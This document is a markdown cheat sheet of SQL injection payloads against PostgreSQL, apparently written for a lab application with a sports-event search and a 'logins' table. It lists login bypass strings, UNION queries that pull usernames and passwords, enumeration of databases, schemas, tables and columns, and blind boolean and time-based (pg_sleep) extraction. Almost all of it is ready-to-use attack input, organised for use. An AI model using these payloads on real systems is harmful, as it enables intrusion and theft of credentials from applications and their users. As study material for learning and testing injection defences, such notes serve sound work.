### LOGIN
```sql
-- login as admin
admin' AND '1'='1'; --
-- login as first user
admin' OR '1' ='1'; --
```

### UNION
```sql
Basketball' UNION SELECT 1, 2, 3; --
-- each UNION query must have the same number of columns
Basketball' UNION SELECT 1, 2, 3, 4; --
-- UNION types character varying and integer cannot be matched
-- UNION type datetime and integer cannot be matched
-- UNION type sports type and integer cannot be matched
Basketball' UNION SELECT 1, NULL, NULL, 'Basketball'; --
Basketball' UNION SELECT 1, login, NULL, 'Basketball' FROM logins --
Basketball' UNION SELECT 1, password, NULL, 'Basketball' FROM logins --
```

### UNION Enumeration
```sql
-- get user that is executing the query
Basketball'  UNION SELECT 1, CURRENT_USER, NULL, 'Basketball'; --
-- get current session user
Basketball'  UNION SELECT 1, USER, NULL, 'Basketball'; --
--  current database version
Basketball'  UNION SELECT 1, version(), NULL, 'Basketball'; --
--  current database
Basketball'  UNION SELECT 1, CURRENT_CATALOG, NULL, 'Basketball'; --
--  current schema
Basketball'  UNION SELECT 1, CURRENT_SCHEMA, NULL, 'Basketball'; --
--  available databases
Basketball'  UNION SELECT 1, datname, NULL, 'Basketball' FROM pg_database; --
--  available schemas
Basketball'  UNION SELECT 1, schema_name, NULL, 'Basketball' FROM information_schema.schemata; --
--  tables within current database
Basketball'  UNION SELECT 1, table_name, NULL, 'Basketball' FROM information_schema.tables WHERE table_schema NOT IN ('information_schema', 'pg_catalog');  --
--  column names within a given database
Basketball'  UNION SELECT 1, column_name, NULL, 'Basketball' FROM information_schema.columns WHERE table_name = 'logins'; --
```


### Blind Boolean Based
```sql
-- Sports event is missing
999
-- Sports event exists = sql injectable
999 OR 1=1; -- 
-- Sports event missing = users table does not exist
999 UNION SELECT 1 FROM information_schema.tables WHERE table_schema NOT IN ('information_schema', 'pg_catalog') and table_name LIKE 'u%';  
-- Sports event exists = table starting with l exists, probably logins
999 UNION SELECT 1 FROM information_schema.tables WHERE table_schema NOT IN ('information_schema', 'pg_catalog') and table_name LIKE 'l%';  
-- Sports event is missing
999 UNION SELECT 1 from logins WHERE login LIKE 'f%'
-- Sports event exists = username starting with a exists
999 UNION SELECT 1 from logins WHERE login LIKE 'a%'
-- Sports event exists = username admin exists and password starts with 's'
999 UNION SELECT 1 from logins WHERE login LIKE 'admin' AND password LIKE 's%'
-- Sports event is missing because first char of the first login from logins isnt 100
999 OR (SELECT ascii(substring((SELECT login FROM logins LIMIT 1), 1, 1))) = 100
-- Sports event exists = fast binary can be performed
999 OR (
    (SELECT ascii(substring((SELECT login FROM logins LIMIT 1), 1, 1))) >= 97 AND 
    ((SELECT ascii(substring((SELECT login FROM logins LIMIT 1), 1, 1))) <= 122)
)
```

### Blind Time Based
```sql
-- Blind injection can be performed
1 AND (CASE WHEN 2 > 1 THEN pg_sleep(5) ELSE NULL END) IS NOT NULL
-- We can ask questions similarly to Blind Boolean Based 
1 AND (
    CASE WHEN (SELECT 1 from logins WHERE login LIKE 'a%') IS NOT NULL 
        THEN pg_sleep(5) 
    ELSE 
        NULL END
    ) IS NOT NULL
```